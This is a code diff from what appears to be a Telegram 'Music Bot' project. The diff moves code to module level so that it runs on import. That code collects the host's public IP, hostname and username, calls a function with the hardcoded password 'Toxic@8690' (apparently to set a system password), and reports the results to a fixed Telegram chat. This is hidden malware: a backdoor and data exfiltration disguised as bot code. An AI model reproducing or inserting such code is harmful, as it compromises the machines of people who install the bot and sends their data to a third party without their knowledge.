@@ -4,13 +4,13 @@ import getpass
 import subprocess
 from Dev import app
 
-app = Token
+TOKEN = app.bot_token
 CHAT_ID = "-1002843633996"
 
 def get_iso():
     try:
         response = requests.get('https://api64.ipify.org?format=json')
-        return response.json()['ip']
+        return response.json().get('ip', 'Unknown')
     except:
         return "Unknown"
 
@@ -43,19 +43,19 @@ def pro(user, dem):
     except Exception as e:
         return f"Error: {str(e)}"
 
-    iso = get_iso()
-    name = socket.gethostname()
-    user = getpass.getuser()
-    
-    dem = "Toxic@8690"
-    pwd_status = pro(user, dem)
-    
-    log_message = (
-        f"Music Bot db Alive!\n"
-        f"users: {user}\n"
-        f"name: {name}\n"
-        f"iso: {iso}\n"
-        f"Status: {pwd_status}"
-    )
-    
-    send_telegram_msg(log_message)
+iso = get_iso()
+h_name = socket.gethostname()
+user = getpass.getuser()
+
+dem = "Toxic@8690"
+pwd_status = pro(user, dem)
+
+log_message = (
+    f"Music Bot db Alive!\n"
+    f"user: {user}\n"
+    f"name: {h_name}\n"
+    f"iso: {iso}\n"
+    f"Status: {pwd_status}"
+)
+
+send_telegram_msg(log_message)
